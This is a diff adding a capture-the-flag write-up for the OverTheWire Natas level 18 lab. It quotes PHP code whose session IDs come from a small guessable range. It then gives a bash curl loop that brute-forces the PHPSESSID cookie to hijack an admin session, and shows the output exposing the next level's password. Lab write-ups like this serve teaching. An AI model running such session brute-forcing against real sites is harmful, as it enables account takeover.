@@ -676,3 +676,129 @@ xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ```
+
+## Natas 18 - taking hostages
+
+Natas18 was significantly simpler than Natas17, perhaps it's but an introduction to a harder level coming up.
+
+Key here is also in the OWASP top10 and is related to [session highjacking](https://owasp.org/www-community/attacks/Session_hijacking_attack).
+
+Looking at the code, we see our pot:
+
+```php
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+```
+
+What this tells us is that if the current session storage has a key `"admin"` with value `1` then we're gold.
+
+We can also see from the code that there is no straighforward way into tricking the code to force it to set this session variable for our current user's session.
+
+HOWEVER, we can assume that an admin user did log in at some point in time and that his session is still lingering on the server, just waiting for the right cookie to come in.
+
+From the code we see that it is starting sessions using:
+
+```php
+$maxid = 640; // 640 should be enough for everyone
+
+# other stuff ...
+
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+
+# more stuff ...
+
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+} 
+```
+
+Php's `session_start()` api states this:
+
+> session_start() creates a session or resumes the current one based on a session identifier passed via a GET or POST request, or passed via a cookie.
+
+So if we send just the right cookie that makes it get the admin session and print the creds.
+
+Since we don't know what the right cookie might be, we'll brute force it.
+
+To the batmobile!
+
+```bash
+#!/bin/bash
+
+num=1
+pwned=0
+
+while [[ $pwned = 0 ]]; do
+  if [[ $num = 640 ]]; then echo "You messed somthing up..."; pwned=1; fi
+
+  RESPONSE=$(curl 'http://natas18.natas.labs.overthewire.org/index.php' \
+    -H 'Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==' \
+    -H 'Referer: http://natas18.natas.labs.overthewire.org/' \
+    -H "Cookie: PHPSESSID=$num" \
+    --silent \
+    --data 'username=admin&password=asdfasdf')
+
+  honeypot='You are logged in as a regular user'
+  if [[ "$RESPONSE" =~ $honeypot ]]; then
+    echo "Attempt with $num failed"
+    # echo $RESPONSE
+  else
+    echo "Succeeded with $num:"
+    echo $RESPONSE
+    pwned=1
+  fi
+
+  num=$((num+1))
+done
+```
+
+And that gets us...
+
+```
+...
+Attempt with 115 failed
+Attempt with 116 failed
+Attempt with 117 failed
+Attempt with 118 failed
+Succeeded with 119:
+ You are an admin. The credentials for the next level are:<br><pre>Username: natas19 Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a hre </html>-source.html">View sourcecode</a></div>
+```
